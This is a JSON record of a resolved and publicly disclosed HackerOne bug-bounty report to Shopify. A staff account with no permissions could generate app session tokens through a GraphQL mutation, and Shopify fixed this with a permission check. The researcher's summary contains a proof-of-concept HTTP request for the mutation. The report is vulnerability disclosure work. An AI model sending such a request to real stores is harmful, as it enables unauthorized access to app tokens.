{"id":898528,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTg1Mjg=","url":"https://hackerone.com/reports/898528","title":"GraphQL AdminGenerateSessionPayload is leaked to staff with no permission","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-06-15T10:46:14.222Z","submitted_at":"2020-06-15T10:46:14.222Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hiffley","url":"/hiffley","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-07-16T09:14:46.888Z","bug_reporter_agreed_on_going_public_at":"2020-07-16T09:14:46.832Z","team_member_agreed_on_going_public_at":"2020-07-15T14:14:55.209Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","bounty_amount":"2000.0","formatted_bounty":"$2,000","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":166,"voters":["svalkanov","yavolo","battle_angel","drsniper","n0x496n","mashoud1122","un4gi","ninetynine","prophet","fpatrik","and 156 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8304921,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-06-16T10:56:32.973Z","updated_at":"2020-06-16T10:56:32.973Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8306518,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-16T13:41:05.469Z","updated_at":"2020-06-16T13:41:05.469Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8307012,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-06-16T14:22:41.455Z","updated_at":"2020-06-16T14:23:47.954Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8314277,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-06-17T03:21:30.258Z","updated_at":"2020-06-17T03:21:30.258Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8318074,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-06-17T11:17:32.798Z","updated_at":"2020-06-17T11:17:32.798Z","additional_data":{"duplicate_report_id":900326},"actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8320784,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-06-17T14:26:09.500Z","updated_at":"2020-06-17T14:26:09.500Z","additional_data":{"duplicate_report_id":900608},"actor":{"username":"h13-","cleared":false,"url":"/h13-","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/910/09de946f9c4ce6668fc07f4613a450177f4c430d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8322426,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-06-17T17:12:42.529Z","updated_at":"2020-06-17T17:12:42.529Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"hiffley","url":"/hiffley"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8323902,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-06-17T19:44:37.040Z","updated_at":"2020-06-17T19:45:39.287Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8370337,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-06-22T11:48:43.212Z","updated_at":"2020-06-22T11:48:43.212Z","additional_data":{"duplicate_report_id":904531},"actor":{"username":"jmp_35p","cleared":false,"url":"/jmp_35p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8371284,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-06-22T13:14:16.519Z","updated_at":"2020-06-22T13:14:16.519Z","additional_data":{},"actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8401577,"is_internal":false,"editable":false,"type":"Activities::ExternalUserRemoved","message":"","automated_response":false,"created_at":"2020-06-25T03:43:28.757Z","updated_at":"2020-06-25T03:43:28.757Z","actor":{"username":"langduvnsec","cleared":false,"url":"/langduvnsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sqkkRRnFnRjVnYraR4PjLRjz/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"removed_user":{"url":"/langduvnsec","username":"langduvnsec"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8406597,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-06-25T13:50:42.174Z","updated_at":"2020-06-25T13:50:42.174Z","additional_data":{"duplicate_report_id":907457},"actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8478708,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-07-02T11:36:08.200Z","updated_at":"2020-07-02T11:36:08.200Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8593710,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-07-14T13:18:48.033Z","updated_at":"2020-07-14T13:18:48.033Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"hiffley","url":"/hiffley"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8595238,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-07-14T15:31:31.722Z","updated_at":"2020-07-14T15:31:31.722Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8608443,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-15T14:14:55.235Z","updated_at":"2020-07-15T14:14:55.235Z","first_to_agree":true,"actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8608505,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-07-15T14:20:51.734Z","updated_at":"2020-07-15T14:20:51.734Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8616244,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-16T09:14:46.852Z","updated_at":"2020-07-16T09:14:46.852Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8616245,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-07-16T09:14:46.915Z","updated_at":"2020-07-16T09:14:46.915Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8617901,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2020-07-16T11:29:57.525Z","updated_at":"2020-07-16T11:29:57.525Z","actor":{"username":"h13-","cleared":false,"url":"/h13-","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/910/09de946f9c4ce6668fc07f4613a450177f4c430d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8617912,"is_internal":false,"editable":false,"type":"Activities::ExternalUserRemoved","message":"","automated_response":false,"created_at":"2020-07-16T11:32:28.556Z","updated_at":"2020-07-16T11:32:28.556Z","actor":{"username":"h13-","cleared":false,"url":"/h13-","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/018/910/09de946f9c4ce6668fc07f4613a450177f4c430d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"removed_user":{"url":"/h13-","username":"h13-"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":13054862,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2021-08-18T15:50:46.710Z","updated_at":"2021-08-18T15:50:46.710Z","actor":{"username":"hiffley","cleared":false,"url":"/hiffley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":13056709,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2021-08-18T18:19:15.972Z","updated_at":"2021-08-18T18:19:15.972Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":13056711,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2021-08-18T18:19:25.044Z","updated_at":"2021-08-18T18:19:25.044Z","additional_data":{},"actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":23533,"category":"team","content":"@hiffley reported the ability to generate app tokens via the adminGenerateSession mutation in Shopify Admin, as a staff member with no permissions. This allowed for accessing a small subset of installed apps that are using this new flow (including Shopify Email). Access was limited to the current shop. We fixed this by adding a check for Apps permission to this mutation. \n\nThis is a limited disclosure at the request of @hiffley.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":75410,"username":"jenn-shopify","name":"jenn","bio":"","cleared":false,"website":null,"location":"","created_at":"2016-05-09T18:26:09.949Z","url":"https://hackerone.com/jenn-shopify","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"company","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}},{"id":23540,"category":"researcher","content":"POC request:\n```\nPOST /admin/internal/web/graphql/core HTTP/1.1\nHost: blabla.myshopify.com\nContent-Length: 225\n\n{\"operationName\":\"GenerateSessionToken\",\"variables\":{\"appId\":\"gid://shopify/App/\"},\"query\":\"mutation GenerateSessionToken($appId: ID!) {\\n  adminGenerateSession(appId: $appId) {\\n    session\\n    __typename\\n  }\\n}\\n\"}\n```","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":1107904,"username":"hiffley","name":"Hiffley","bio":null,"cleared":false,"website":null,"location":null,"created_at":"2020-05-06T06:59:17.129Z","url":"https://hackerone.com/hiffley","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}}]}